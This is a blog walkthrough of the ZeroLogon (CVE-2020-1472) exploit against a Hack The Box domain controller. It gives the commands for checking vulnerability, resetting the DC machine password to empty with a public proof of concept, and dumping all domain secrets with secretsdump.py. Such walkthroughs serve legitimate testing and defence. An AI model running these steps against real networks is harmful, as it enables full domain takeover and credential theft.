---
layout: single
title:  "CVE-2020-1472 - ZeroLogon"
date:   2020-09-20 08:49:23 +0100
categories: windows
excerpt: Simple Walkthrough of using the ZeroLogon exploit
---

## Overview
The attack described here takes advantage of flaws in a cryptographic authentication protocol that proves the authenticity and identity of a domain-joined computer to the DC. Due to incorrect use of an AES mode of operation it is possible to spoof the identity of any computer account (including that of the DC itself) and set an empty password for that account in the domain. (Secura)

## WhitePaper

[**Found Here**](https://www.secura.com/pathtoimg.php?id=2055)

## Installation

Firstly, you need the latest version of impacket from [here](https://github.com/SecureAuthCorp/impacket)

{% highlight powershell linenos %}
git clone https://github.com/SecureAuthCorp/impacket.git
{% endhighlight %}

![](/images/zerologon/clone.png)


Then cd into the folder and execute

{% highlight powershell linenos %}
pip3 install .
{% endhighlight %}

![](/images/zerologon/install-impacket.png)


## Testing if a DC is vulnerable
Spoiler, they probably are.

First, clone the following [repo](https://github.com/SecuraBV/CVE-2020-1472) and install the requirements

{% highlight powershell linenos %}
git clone https://github.com/SecuraBV/CVE-2020-1472.git
{% endhighlight %}

![](/images/zerologon/tester.png)


{% highlight powershell linenos %}
cd CVE-2020-1472
pip3 install -r requirements.txt
{% endhighlight %}

![](/images/zerologon/tester-setup.png)

### Running the Check Script

Now that we have the testing script installed, we can check a host to see if they are vulnerable, I will be running this against the [Multimaster machine](https://www.hackthebox.eu/home/machines/profile/232) from Hack The Box.

The command is as follows:
{% highlight powershell linenos %}
python zerologon_tester.py <DC netbios name> <DC-IP>
{% endhighlight %}

![](/images/zerologon/compromised-tester.png)

Bingo! We can see that the host is vulnerable!


## Exploiting a Domain Controller

### Risks
If you are doing this in a working production environment then you need to make sure you have the hash of the Domain Controller Machine Account as this wil be needed to reset the host after you have exploited it, otherwise it will no longer be able to communicate with other DC's.

### Getting the POC

To get the exploit, clone this [git repo](https://github.com/dirkjanm/CVE-2020-1472) and make sure you have impacket installed

{% highlight powershell linenos %}
git clone https://github.com/dirkjanm/CVE-2020-1472.git
{% endhighlight %}

![](/images/zerologon/exploit.png)

Now we can run the exploit against our vulnerable target machine

{% highlight powershell linenos %}
python cve-2020-1472-exploit.py <NETBIOS NAME> <DC-IP>
{% endhighlight %}

![](/images/zerologon/exploit-1.png)

If all was sucessfull you will get a `Result: 0`

### Dumping Domain Secrets with secretsdump.py

Now we have set the machine password to an empty string, "", we can now DCSync with secretsdump.py to get all the domain secrets.

{% highlight powershell linenos %}
secretsdump.py -just-dc -no-pass DCHOSTNAME$@DC-IP
{% endhighlight %}

![](/images/zerologon/exploit-2.png)

And just like that I've owned your whole AD Environment, in less that two minutes.


## Respect
If you enjoyed the write up or found it useful consider + repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

